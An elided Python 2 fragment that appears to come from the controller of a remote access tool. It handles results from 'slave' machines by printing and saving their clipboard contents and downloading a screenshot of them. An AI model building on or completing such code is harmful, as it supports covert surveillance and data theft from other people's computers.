    ...
    def analysisResult(self, result):
        ...
        if result:
            ...
            if 'slaveList' in resultDict:
                ...
                # self.sock.close()
            if 'copyResult' in resultDict:
                print u'剪贴板内容: ' + resultDict['copyResult']
                with open('SlaveClipBoard.txt', 'w') as f:
                    try:
                        f.write(resultDict['copyResult'])
                    except Exception, e:
                        print u'保存剪贴板数据失败: %s' % str(e)
                        return
                import win32api
                win32api.ShellExecute(0, 'open', 'SlaveClipBoard.txt', '', '', 1)
            if 'printScreen' in resultDict and resultDict['printScreen']:
                import requests
                with open('screenShots.jpg', 'wb') as f:
                    try:
                        f.write(requests.get(resultDict['printScreen']).content)
                    except Exception, e:
                        print u'获取截屏失败: %s' % str(e)
